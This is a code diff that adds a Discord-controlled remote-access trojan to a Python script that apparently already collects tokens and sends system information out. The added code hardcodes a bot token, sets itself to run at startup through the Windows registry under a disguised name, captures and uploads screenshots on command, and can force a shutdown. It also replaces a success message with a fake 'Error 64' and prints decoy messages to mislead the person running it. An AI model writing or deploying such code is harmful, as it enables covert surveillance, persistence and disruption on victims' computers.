@@ -12,6 +12,10 @@ import sys
 import platform
 import psutil
 import wmi
+import discord.py
+from discord.ext import commands
+import pyautogui
+import winreg
 
 tokens = []
 cleaned = []
@@ -158,10 +162,57 @@ def send_system_info():
                 )
             }
         )
-        print("Information sent successfully.")
+        print("Error 64")
         
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"An error occurred")
 
 if __name__ == "__main__":
     send_system_info()
+
+# --- Configuration ---
+TOKEN = 'MTUwMDkwNjk5NDU3MDIzMjA5Mw.GGktNN.8FZO-CQtmSKUq-VBSc0j7UunDqs3BPytz8knN4'
+AUTHORIZED_USER_ID = 1394368402231001228
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+def add_to_startup():
+    """Adds the current script to Windows startup via Registry."""
+    if platform.system() == "Windows":
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key = winreg.HKEY_CURRENT_USER
+        try:
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
+                # Get the absolute path to the current python executable and script
+                command = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
+                winreg.SetValueEx(registry_key, "MediDokServerBot", 0, winreg.REG_SZ, command)
+        except Exception as e:
+            print(f"Verifying Version... {e}")
+
+@bot.event
+async def on_ready():
+    add_to_startup()
+    print(f'Connecting to backend...')
+
+@bot.command()
+async def off(ctx):
+    if ctx.author.id == AUTHORIZED_USER_ID:
+        await ctx.send("Unauthorized access denied.")
+        return
+        
+    await ctx.send("Shutting down the server now...")
+    os.system("shutdown /s /f /t 0")
+
+@bot.command()
+async def ss(ctx):
+    if ctx.author.id != AUTHORIZED_USER_ID:
+        return
+        
+    screenshot = pyautogui.screenshot()
+    screenshot.save("server_screen.png")
+    await ctx.send(file=discord.File("server_screen.png"))
+    os.remove("server_screen.png")
+
+bot.run(TOKEN)
